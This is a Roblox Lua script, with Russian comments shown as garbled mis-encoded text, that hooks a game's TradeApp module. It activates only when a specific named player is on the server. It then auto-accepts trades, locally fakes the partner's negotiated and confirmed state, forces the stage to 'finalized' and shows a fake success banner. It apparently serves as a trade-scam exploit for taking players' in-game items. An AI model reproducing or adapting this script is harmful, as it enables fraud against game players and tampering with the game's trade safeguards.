-- ‚úÖ –°–∫—Ä–∏–ø—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –µ—Å—Ç—å –∏–≥—Ä–æ–∫ —Å –Ω–∏–∫–æ–º "Sabrispinsss"
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –Ω—É–∂–Ω–æ–≥–æ –∏–≥—Ä–æ–∫–∞
local function IsSabrispinsssInServer()
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr.Name == "Sabrispinsss" then
			return true
		end
	end
	return false
end

-- –ï—Å–ª–∏ –∏–≥—Ä–æ–∫–∞ –Ω–µ—Ç ‚Äî –ø—Ä–µ—Ä—ã–≤–∞–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ
if not IsSabrispinsssInServer() then
	warn("[TradeButton] –ò–≥—Ä–æ–∫ Sabrispinsss –Ω–µ –Ω–∞–π–¥–µ–Ω –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ ‚Äî —Å–∫—Ä–∏–ø—Ç –Ω–µ –∑–∞–ø—É—â–µ–Ω.")
	return
end

-- –ï—Å–ª–∏ –ø–æ–∑–∂–µ –æ–Ω –≤—ã–π–¥–µ—Ç ‚Äî –º–æ–∂–Ω–æ —Å–∫—Ä—ã—Ç—å –∫–Ω–æ–ø–∫—É
Players.PlayerRemoving:Connect(function(plr)
	if plr.Name == "Sabrispinsss" then
		if LocalPlayer:FindFirstChild("PlayerGui") then
			local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeAutoTradeGUI")
			if gui then gui:Destroy() end
		end
		warn("[TradeButton] Sabrispinsss –≤—ã—à–µ–ª ‚Äî —Å–∫—Ä–∏–ø—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –∏ GUI —É–¥–∞–ª—ë–Ω.")
	end
end)

-------------------------------------------------------------------
-- üß© –°–æ–∑–¥–∞–Ω–∏–µ –∫–Ω–æ–ø–∫–∏ –≤ PlayerGui
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TradeAutoTradeGUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- üîò –ö–Ω–æ–ø–∫–∞ –∑–∞–ø—É—Å–∫–∞
local button = Instance.new("TextButton")
button.Name = "StartAutoTrade"
button.Size = UDim2.new(0, 100, 0, 30)
button.Position = UDim2.new(0.05, 0, 0.3, 0)
button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Text = "Start Trade"
button.Font = Enum.Font.SourceSansBold
button.TextSize = 16
button.AutoButtonColor = true
button.Active = true
button.Parent = screenGui

-------------------------------------------------------------------
-- üß≤ –ü–µ—Ä–µ—Ç–∞—Å–∫–∏–≤–∞–Ω–∏–µ –∫–Ω–æ–ø–∫–∏
local UIS = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

local function update(input)
	local delta = input.Position - dragStart
	button.Position = UDim2.new(
		startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y
	)
end

button.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = button.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)

button.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UIS.InputChanged:Connect(function(input)
	if input == dragInput and dragging then update(input) end
end)

-------------------------------------------------------------------
-- üõ°Ô∏è –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π require
local function safeRequire(module)
	local ok, result = pcall(require, module)
	if not ok then
		warn("[TradeButton] –û—à–∏–±–∫–∞ –ø—Ä–∏ require:", module, result)
		return nil
	end
	return result
end

-------------------------------------------------------------------
-- üöÄ –õ–æ–≥–∏–∫–∞ –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏
button.MouseButton1Click:Connect(function()
	print("‚ñ∂Ô∏è [TradeButton] –ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ—Ç—Ä–µ–π–¥–∞...")

	local UIManager = safeRequire(game.ReplicatedStorage.ClientModules.Core.UIManager.UIManager)
	local TradeAppModule = safeRequire(game.ReplicatedStorage.ClientModules.Core.UIManager.Apps.TradeApp)

	if UIManager and UIManager.set_app_visibility then
		print("‚úÖ UIManager –Ω–∞–π–¥–µ–Ω, –∞–∫—Ç–∏–≤–∏—Ä—É–µ–º TradeApp —á–µ—Ä–µ–∑ set_app_visibility()")
		UIManager.set_app_visibility("TradeApp", true)
	else
		warn("‚ùå –§—É–Ω–∫—Ü–∏—è set_app_visibility –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
	end

	-------------------------------------------------------
	-- üîí –ó–∞—â–∏—Ç–∞ –∏ —Ñ–∏–∫—Å—ã –¥–ª—è TradeApp
	task.defer(function()
		print("[TradeFix] Searching for TradeApp...")

		local tradeApp
		for i = 1, 200 do
			local found = game.ReplicatedStorage:FindFirstChild("TradeApp", true)
			if found and found:IsA("ModuleScript") then
				local ok, result = pcall(require, found)
				if ok and type(result) == "table" then
					tradeApp = result
					print("[TradeFix] Found TradeApp module ‚úÖ")
					break
				end
			end
			task.wait(0.1)
		end

		if not tradeApp then
			warn("[TradeFix] Could not find or require TradeApp after waiting")
			return
		end

		-- –∑–∞—â–∏—Ç–∞ –æ—Ç nil sender/recipient
		local old_get_my_offer = tradeApp._get_my_offer
		if old_get_my_offer then
			tradeApp._get_my_offer = function(self, ...)
				local ok, state = pcall(function() return self:_get_local_trade_state() end)
				if not ok or not state or not state.sender then
					warn("[TradeFix] _get_my_offer() called before init")
					return { items = {} }, "sender_offer"
				end
				return old_get_my_offer(self, ...)
			end
		end

		local old_get_partner_offer = tradeApp._get_partner_offer
		if old_get_partner_offer then
			tradeApp._get_partner_offer = function(self, ...)
				local ok, state = pcall(function() return self:_get_local_trade_state() end)
				if not ok or not state or not state.recipient then
					warn("[TradeFix] _get_partner_offer() called before init")
					return { items = {} }, "recipient_offer"
				end
				return old_get_partner_offer(self, ...)
			end
		end

		print("[TradeFix] TradeApp patched successfully ‚úÖ")
	end)

	-------------------------------------------------------
	-- üß© –î–æ–ø. –∑–∞—â–∏—Ç–∞ state merge
	task.defer(function()
		local found = game.ReplicatedStorage:FindFirstChild("TradeApp", true)
		if not found or not found:IsA("ModuleScript") then return end

		local ok, tradeApp = pcall(require, found)
		if not ok or type(tradeApp) ~= "table" then return end

		local old_change = tradeApp._change_local_trade_state
		tradeApp._change_local_trade_state = function(self, state)
			if not self.local_trade_state or type(self.local_trade_state) ~= "table" then
				warn("[TradeFix] _change_local_trade_state() called before init")
				self.local_trade_state = {
					sender_offer = { items = {} },
					recipient_offer = { items = {} },
					sender = Players.LocalPlayer,
					recipient = Players.LocalPlayer,
					current_stage = "negotiation",
					trade_id = 0
				}
			end
			return old_change(self, state)
		end

		local old_overwrite = tradeApp._overwrite_local_trade_state
		tradeApp._overwrite_local_trade_state = function(self, state)
			if not state or type(state) ~= "table" then
				warn("[TradeFix] _overwrite_local_trade_state() received nil, ignoring")
				return
			end
			return old_overwrite(self, state)
		end

		print("[TradeFix] Extra state protections installed ‚úÖ")
	end)

	-------------------------------------------------------
	-- ü§ñ –ê–≤—Ç–æ—Ç—Ä–µ–¥ (Accept ‚Üí Confirm ‚Üí Success ‚Üí Close)
	task.defer(function()
		print("[TradeAutoTrade] –ñ–¥—ë–º –∑–∞–≥—Ä—É–∑–∫—É TradeApp...")

		local tradeApp
		for i = 1, 200 do
			local found = game.ReplicatedStorage:FindFirstChild("TradeApp", true)
			if found and found:IsA("ModuleScript") then
				local ok, result = pcall(require, found)
				if ok and type(result) == "table" then
					tradeApp = result
					break
				end
			end
			task.wait(0.1)
		end

		if not tradeApp then
			warn("[TradeAutoTrade] TradeApp –Ω–µ –Ω–∞–π–¥–µ–Ω")
			return
		end

		print("[TradeAutoTrade] TradeApp –∑–∞–≥—Ä—É–∂–µ–Ω ‚úÖ")

		-- üü¢ –ü—Ä–∏ –Ω–æ–≤–æ–º —Ç—Ä–µ–π–¥–µ —Å–±—Ä–∞—Å—ã–≤–∞–µ–º —Ñ–ª–∞–≥ –∞–≤—Ç–æ–∑–∞–∫—Ä—ã—Ç–∏—è
		local oldAccept = tradeApp._on_accept_pressed
		if oldAccept then
			tradeApp._on_accept_pressed = function(self, ...)
				self._tradeAutoClosed = false
				oldAccept(self, ...)
				task.wait(0.3)
				local _, partnerKey = self:_get_partner_offer()
				self:_change_local_trade_state({ [partnerKey] = { negotiated = true } })
				self:refresh_all()
				task.wait(0.4)
				self:_change_local_trade_state({ current_stage = "confirmation" })
				self:refresh_all()
			end
		end

		-- üß± –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π Confirm
		local oldConfirm = tradeApp._on_confirm_pressed
		if oldConfirm then
			tradeApp._on_confirm_pressed = function(self, ...)
				oldConfirm(self, ...)
				if self._tradeAutoClosed then
					warn("[TradeAutoTrade] –ê–≤—Ç–æ–∑–∞–∫—Ä—ã—Ç–∏–µ —É–∂–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–æ ‚Äî –ø—Ä–æ–ø—É—Å–∫.")
					return
				end
				self._tradeAutoClosed = true

				task.wait(0.3)
				local _, partnerKey = self:_get_partner_offer()
				self:_change_local_trade_state({ [partnerKey] = { confirmed = true } })
				self:refresh_all()
				task.wait(0.5)
				self:_change_local_trade_state({ current_stage = "finalized" })
				self:refresh_all()
				task.wait(2)
				if UIManager and UIManager.set_app_visibility then
					UIManager.set_app_visibility("TradeApp", false)
				end
				print("[TradeAutoTrade] –°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ ‚úÖ")

				-- üü¢ –°–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–π —Å–¥–µ–ª–∫–µ
				local oldLabel = screenGui:FindFirstChild("TradeSuccessMessage")
				if oldLabel then oldLabel:Destroy() end

				if screenGui:FindFirstChild("TradeSuccessActive") then return end
				local flag = Instance.new("BoolValue")
				flag.Name = "TradeSuccessActive"
				flag.Parent = screenGui

				local successLabel = Instance.new("TextLabel")
				successLabel.Name = "TradeSuccessMessage"
				successLabel.Text = "The trade was successful!"
				successLabel.TextColor3 = Color3.new(1, 1, 1)
				successLabel.Visible = true
				successLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
				successLabel.Position = UDim2.new(0.5, 0, 0.95, -95)
				successLabel.AnchorPoint = Vector2.new(0.5, 1)
				successLabel.BackgroundTransparency = 1
				successLabel.Font = Enum.Font.SourceSansBold
				successLabel.TextSize = 20
				successLabel.TextStrokeTransparency = 0.5
				successLabel.ZIndex = 10
				successLabel.Parent = screenGui

				local TweenService = game:GetService("TweenService")
				successLabel.TextTransparency = 1
				local fadeIn = TweenService:Create(successLabel, TweenInfo.new(0.4), { TextTransparency = 0 })
				local fadeOut = TweenService:Create(successLabel, TweenInfo.new(0.6), { TextTransparency = 1 })

				fadeIn:Play()
				task.wait(2.5)
				fadeOut:Play()
				fadeOut.Completed:Wait()
				successLabel:Destroy()
				flag:Destroy()
			end
		end
	end)
end)
